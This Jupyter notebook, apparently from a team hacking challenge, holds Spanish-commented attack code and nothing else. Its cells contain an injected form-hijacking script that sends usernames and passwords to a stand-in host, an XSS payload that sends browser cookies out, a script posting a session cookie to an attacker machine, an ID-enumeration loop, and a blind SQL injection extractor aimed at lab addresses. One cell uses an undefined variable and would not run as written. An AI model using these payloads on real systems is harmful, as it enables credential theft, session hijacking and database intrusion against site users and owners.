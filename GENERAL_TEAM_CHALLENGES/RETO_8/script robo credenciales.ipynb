{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<div> <script>\n",
    "  document.addEventListener('DOMContentLoaded', function() {\n",
    "    var form = document.forms[0];\n",
    "    form.addEventListener('submit', function(event) {\n",
    "      event.preventDefault();\n",
    "      var user = form.elements['user'].value;\n",
    "      var pass = form.elements['password'].value;\n",
    "      var xhr = new XMLHttpRequest();\n",
    "      xhr.open('GET', 'http://tu_dominio.com/robar_credenciales.php?user=' + user + '&pass=' + pass, true);\n",
    "      xhr.send();\n",
    "    });\n",
    "  });\n",
    "</script><div>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "//robo de cookies\n",
    "<div>\n",
    "  <script>\n",
    "    // Función para enviar las cookies a un servidor controlado por ti\n",
    "    function sendCookies(cookies) {\n",
    "      var xhr = new XMLHttpRequest();\n",
    "      xhr.open(\"GET\", \"http://tu-servidor.com/captura?cookies=\" + encodeURIComponent(cookies), true);\n",
    "      xhr.send();\n",
    "    }\n",
    "\n",
    "    // Llama a la función con las cookies actuales\n",
    "    sendCookies(document.cookie);\n",
    "  </script>\n",
    "<div>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "                                                            \n",
    "import requests\n",
    "\n",
    "# Definir la URL base\n",
    "base_url = \"http://10.0.2.20/post.php?id=\"\n",
    "\n",
    "# Definir el rango de IDs a verificar\n",
    "id_range = range(1, 101)\n",
    "\n",
    "# Recorrer el rango de IDs\n",
    "for post_id in id_range:\n",
    "    # Construir la URL completa\n",
    "    url = f\"{base_url}{post_id}\"\n",
    "    \n",
    "    # Enviar la solicitud HTTP\n",
    "    response = requests.get(url)\n",
    "    \n",
    "    # Verificar el código de estado de la respuesta\n",
    "    if response.status_code == 200:\n",
    "        print(f\"ID {post_id} está disponible: {url}\")\n",
    "    else:\n",
    "        print(f\"ID {post_id} no está disponible: {url}\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#script para que envie la cookie a tu servidor\n",
    "import requests\n",
    "\n",
    "# Recopilar la cookie\n",
    "cookie = request.cookies.get('session')\n",
    "\n",
    "# Enviar la cookie a tu Kali Linux\n",
    "url = 'http://10.0.2.25:1234/cookie.py'\n",
    "data = {'cookie': cookie}\n",
    "\n",
    "response = requests.post(url, data=data)\n",
    "\n",
    "# Mostrar el resultado\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#script sqli a ciegas\n",
    "import requests\n",
    "\n",
    "url = \"http://10.0.2.21/admin/edit.php?id=1 AND SUBSTRING((SELECT {field} FROM {table} WHERE {condition} LIMIT 1 OFFSET {offset}), {pos}, 1) = '{char}'--\"\n",
    "chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"\n",
    "extracted = \"\"\n",
    "\n",
    "def extract_data(field, table, condition, offset):\n",
    "    global extracted\n",
    "    for pos in range(1, 20):  # Asume que el nombre tiene un máximo de 20 caracteres\n",
    "        for char in chars:\n",
    "            test_url = url.format(field=field, table=table, condition=condition, offset=offset, pos=pos, char=char)\n",
    "            response = requests.get(test_url)\n",
    "            if \"expected output\" in response.text:  # Cambia esto según el comportamiento esperado\n",
    "                extracted += char\n",
    "                print(f\"Encontrado carácter {pos}: {char}\")\n",
    "                break\n",
    "        else:\n",
    "            break\n",
    "\n",
    "extract_data(\"table_name\", \"information_schema.tables\", \"table_schema='blog'\", 0)\n",
    "print(f\"Nombre de la tabla: {extracted}\")\n",
    "\n",
    "# Reiniciar para extraer columnas de la tabla obtenida\n",
    "extracted = \"\"\n",
    "extract_data(\"column_name\", \"information_schema.columns\", \"table_name='comments'\", 0)\n",
    "print(f\"Nombre de la columna: {extracted}\")\n"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
